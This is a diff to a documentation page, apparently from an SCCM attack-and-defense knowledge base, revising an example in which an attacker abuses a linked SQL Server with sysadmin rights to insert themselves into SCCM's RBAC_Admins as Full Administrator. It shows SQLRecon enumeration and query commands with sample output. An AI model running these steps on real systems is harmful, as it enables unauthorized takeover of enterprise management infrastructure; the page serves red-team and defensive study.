@@ -44,27 +44,23 @@ Additionally, `sysadmin` on the site database enables direct database-tier opera
 - [PREVENT-19: Remove unnecessary links to site databases](../../../defense-techniques/PREVENT/PREVENT-19/prevent-19_description.md)
 
 ## Examples
-The following example assumes the attacker has already obtained the ability to execute queries on a third-party SQL Server instance (`thirdparty-sql.corp.local`) that has a linked server named `SCCMSITEDB` pointing at the primary site database (`ps1-db.mayyhem.com`) with a stored login granted `sysadmin`. The end state is the same as TAKEOVER-1 / TAKEOVER-3: the attacker is added to `RBAC_Admins` as a Full Administrator.
+The following example assumes the attacker can query a third-party SQL Server with a linked server named `SCCMSITEDB` pointing at `ps1-db.mayyhem.com`.
 
-1. On the third-party SQL Server, enumerate linked servers and identify hops with `sysadmin` on the remote instance using `SQLRecon`:
-
-    ```
-    SQLRecon.exe -a WindowsInteractive -s thirdparty-sql.corp.local -m links
-    [+] Discovered linked SQL server: SCCMSITEDB (ps1-db.mayyhem.com)
-
-    SQLRecon.exe -a WindowsInteractive -s thirdparty-sql.corp.local -m lwhoami -l SCCMSITEDB
-    [+] Executing @@servername, system_user via linked server SCCMSITEDB:
-    [+] server: ps1-db, user: MAYYHEM\svc_thirdparty_sccm_link
-    [+] sysadmin: True
-    ```
-
-2. Retrieve the hex-formatted SID of the Active Directory user to be elevated (see TAKEOVER-1 for the `sccmhunter mssql` / `SharpSCCM local user-sid` recipe). Assume:
+1. Enumerate linked servers with SQLRecon:
 
     ```
-    User:   MAYYHEM\lowpriv
-    SID:    S-1-5-21-...-1112
-    SID hex: 0x010500000000000515000000D75D21256B6364FD4D95C88158040000
-    Site:   PS1
+    SQLRecon.exe /a:WinToken /h:localhost /m:Links
+    | Linked Server | product | provider   | data_source        | Local Login | Is Self Mapping | Remote Login |
+    | SCCMSITEDB    |         | MSOLEDBSQL | ps1-db.mayyhem.com | N/A         | False           | sccm_link    |
+    ```
+
+2. Check the identity and privileges used across the hop:
+
+    ```
+    SQLRecon.exe /a:WinToken /h:localhost /m:Whoami /l:SCCMSITEDB
+    [*] Logged in as sccm_link
+    [*] Mapped to the user dbo
+    | sysadmin | Yes |
     ```
 
 3. On the third-party SQL Server, execute the RBAC-insert query on the linked instance. The `EXECUTE ... AT` form runs the query on the remote database in the linked login's session, which has `sysadmin`:
@@ -91,10 +87,10 @@ The following example assumes the attacker has already obtained the ability to e
     ') AT [SCCMSITEDB];
     ```
 
-    `SQLRecon`'s query mode simplifies the syntax:
+    SQLRecon's query module can run the same statement:
 
     ```
-    SQLRecon.exe -a WindowsInteractive -s thirdparty-sql.corp.local -m lquery -l SCCMSITEDB -q "USE CM_PS1; INSERT INTO RBAC_Admins ... "
+    SQLRecon.exe /a:WinToken /h:localhost /m:Query /l:SCCMSITEDB /c:"USE CM_PS1; ..."
     ```
 
 4. Confirm that `MAYYHEM\lowpriv` now holds the Full Administrator role in the SCCM console or via `AdminService`.
